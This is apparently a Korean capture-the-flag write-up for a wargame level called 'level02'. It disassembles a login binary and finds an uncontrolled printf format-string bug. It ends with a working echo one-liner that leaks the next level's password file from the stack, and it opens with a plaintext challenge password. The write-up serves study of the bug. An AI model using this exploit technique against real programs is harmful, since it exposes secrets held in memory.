> Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

level02의 어셈블리 코드를 확인해 보면

fopen을 이용해서 다음 레벨의 비밀번호 파일을 읽기 전용으로 연 후

```
400898:	ba b0 0b 40 00 	mov    $0x400bb0,%edx # "r"
40089d:	b8 b2 0b 40 00 	mov    $0x400bb2,%eax # "/home/users/level03/.pass"
4008a2:	48 89 d6       	mov    %rdx,%rsi
4008a5:	48 89 c7       	mov    %rax,%rdi
4008a8:	e8 53 fe ff ff 	callq  400700 <fopen@plt>
```

파일의 내용을 스택에 쓴 뒤

```
4008e6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
4008ed:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
4008f1:	48 89 d1             	mov    %rdx,%rcx
4008f4:	ba 29 00 00 00       	mov    $0x29,%edx
4008f9:	be 01 00 00 00       	mov    $0x1,%esi
4008fe:	48 89 c7             	mov    %rax,%rdi
400901:	e8 8a fd ff ff       	callq  400690 <fread@plt>
```

id / pw을 fgets를 이용해서 입력받고

```
4009c3:	48 8b 05 7e 08 20 00 	mov    0x20087e(%rip),%rax        # 601248 <__bss_start>
4009ca:	48 89 c2             	mov    %rax,%rdx
4009cd:	48 8d 45 90          	lea    -0x70(%rbp),%rax
4009d1:	be 64 00 00 00       	mov    $0x64,%esi
4009d6:	48 89 c7             	mov    %rax,%rdi
4009d9:	e8 12 fd ff ff       	callq  4006f0 <fgets@plt>
4009de:	48 8d 45 90          	lea    -0x70(%rbp),%rax
4009e2:	be f5 0b 40 00       	mov    $0x400bf5,%esi
4009e7:	48 89 c7             	mov    %rax,%rdi
4009ea:	e8 e1 fc ff ff       	callq  4006d0 <strcspn@plt>
4009ef:	c6 44 05 90 00       	movb   $0x0,-0x70(%rbp,%rax,1)
4009f4:	b8 e8 0c 40 00       	mov    $0x400ce8,%eax
4009f9:	48 89 c7             	mov    %rax,%rdi
4009fc:	b8 00 00 00 00       	mov    $0x0,%eax
400a01:	e8 ba fc ff ff       	callq  4006c0 <printf@plt>
400a06:	48 8b 05 3b 08 20 00 	mov    0x20083b(%rip),%rax        # 601248 <__bss_start>
400a0d:	48 89 c2             	mov    %rax,%rdx
400a10:	48 8d 85 f0 fe ff ff 	lea    -0x110(%rbp),%rax
400a17:	be 64 00 00 00       	mov    $0x64,%esi
400a1c:	48 89 c7             	mov    %rax,%rdi
400a1f:	e8 cc fc ff ff       	callq  4006f0 <fgets@plt>
```

strncmp를 이용해서 사용자가 입력한 pw와 .pass파일의 내용을 비교해서 같을 경우 

```
400a4a:	48 8d 8d f0 fe ff ff 	lea    -0x110(%rbp),%rcx
400a51:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
400a58:	ba 29 00 00 00       	mov    $0x29,%edx
400a5d:	48 89 ce             	mov    %rcx,%rsi
400a60:	48 89 c7             	mov    %rax,%rdi
400a63:	e8 08 fc ff ff       	callq  400670 <strncmp@plt>
```

쉘을 호출하는 프로그램이다.

```
400a85:	bf 32 0d 40 00       	mov    $0x400d32,%edi
400a8a:	e8 21 fc ff ff       	callq  4006b0 <system@plt>
```

만약 비밀번호가 틀렸을 경우 printf를 이용해서 id에게는 권한이 없다는 출력이 나오는데

printf의 첫 인자로 바로 사용자가 입력한 id의 주소를 넣는 것을 볼 수 있다.

```
400a96:	48 8d 45 90          	lea    -0x70(%rbp),%rax
400a9a:	48 89 c7             	mov    %rax,%rdi
400a9d:	b8 00 00 00 00       	mov    $0x0,%eax
400aa2:	e8 19 fc ff ff       	callq  4006c0 <printf@plt>
```

실제로 %d 같은 입력을 넣었을 때 메모리의 값이 유출되는 것을 확인할 수 있다.

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %d
--[ Password: a
*****************************************
-6976 does not have access!
```

스택이 총 0x120byte만큼 할당되었고, password의 주소는 -0x110(%rbp) = rsp + 0x10이며 -0xa0(%rbp)위치에 원하는 문자열이 들어있으므로

printf 에서 %.0s 를 총 7번 넣은 뒤 %s를 넣어서 password로 넣은 값을 주소로 취급할 수 있고, password에는 -0xa0(%rbp)의 절대 위치를 넣어서 .pass의 내용을 출력할 수 있다.

```c
printf(RDI /* format string */, RSI, RDX, RCX, R8, R9, rsp, rsp + 0x8, rsp + 0x10 /* password */);
```

```bash
echo -en '%.0s%.0s%.0s%.0s%.0s%.0s%.0s.pass=[%s]\n\x30\xe5\xff\xff\xff\x7f\x00\x00' | ./level02
```
